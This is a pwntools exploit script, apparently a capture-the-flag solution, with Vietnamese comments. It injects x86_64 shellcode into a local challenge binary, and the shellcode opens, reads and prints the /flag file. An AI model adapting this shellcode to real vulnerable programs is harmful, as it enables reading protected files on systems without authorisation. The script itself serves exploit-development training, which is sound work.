from pwn import *


exe = ELF('/challenge/ello-ackers')
p = process(exe.path)
context.arch = 'amd64'
#note:
#1 Kiến trúc x86_64 không cho phép push trực tiếp một số lớn hơn 32-bit (chuỗi /flag\x00 của bạn dài khoảng 40-bit).

#2 Hàm sys_open (rax = 2) yêu cầu rdi phải là một con trỏ (pointer) trỏ đến vùng nhớ chứa tên tệp, chứ không phải chứa trực 
#tiếp giá trị của chuỗi đó.
shellcode= asm('''
    mov DWORD PTR [rsp], 0x616c662f
    mov WORD PTR [rsp+4],0x0067
    push rsp
    pop rdi
    mov eax, 0x02
    xor edx,edx
    xor esi,esi
    syscall

    push rsp
    mov edi,eax
    pop rsi
    mov edx, 0x100
    mov eax, 0
    syscall

    push rsp
    pop rsi
    mov edi, 1
    mov edx, eax
    mov eax, 0x1
    syscall
''')
p.send(shellcode)
p.interactive()
